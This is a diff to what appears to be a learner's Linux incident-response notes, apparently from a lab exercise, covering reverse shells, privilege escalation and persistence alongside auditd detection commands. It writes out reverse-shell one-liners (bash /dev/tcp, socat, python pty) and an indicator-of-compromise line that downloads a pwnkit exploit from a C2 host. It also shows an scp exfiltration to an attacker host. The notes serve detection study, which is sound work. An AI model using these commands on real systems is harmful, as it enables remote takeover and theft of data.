@@ -98,6 +98,53 @@ Common commands :
 
 bash -i >& /dev/tcp/10.10.10.10/1337 0>&1    \  it forces the victim to connect to 10.10.10.10:1337 and launch bash
 
+socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane \ socat alternative
+
+python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")' \ python alternative
+
+Detecting reverse shells : 
+
+ ausearch -i -x socat \ looks for suspicious commands, afterwaards move up the process tree to find the origin
+
+-----------
+
+### Priviledge escalation
+
+ An attacker after breaching the machine won't usually have enough priviledge  to perform his intended actions, that's why he'll attempt priviledge escalation
+
+ Common techniques : 
+
+- Find old versions of Ubuntu = uname -a
+
+- Detecting SUID flag to get root access with the SUID vulnerability = find /bin -perm 4000
+
+- Expose unprotected bakup keys =  ls /etc/ssh
+
+ Indicators of compromise : 
+
+ - Spike of discovery commands
+
+ - Download to temp directory of pwnkit exploit = wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c \ chmod +x /tmp/pwnkit
+
+ - Data exfil with scp = scp dump.tar.gz attacker@c2-server.thm:~
+
+   Detecting activity :  ausearch -i -x pwnkit
+
+----------
+
+### Persistence
+
+Some threat actors will extablish backdoors to keep presistence on  the machine
+
+Cron : runs a process on schedule for persistence
+
+Detection : ausearch -i -f /etc/systemd \ looks or file changes inside the directory
+
+ ausearch -i -x crontab \ looks for execution of crontabs
+
+ --------------
+
+ 
 
 
 
@@ -108,18 +155,4 @@ bash -i >& /dev/tcp/10.10.10.10/1337 0>&1    \  it forces the victim to connect 
 
 
 
-
-
-
-
-
-
-
-
-
-It brute forces the systems
-
-<img width="1015" height="248" alt="image" src="https://github.com/user-attachments/assets/c3cdb231-5a5a-44ad-87bc-9c50d5f42f6d" />
-
-in this screenshot I used grep with accepted authentication to find who successfully brute forced the machine
 
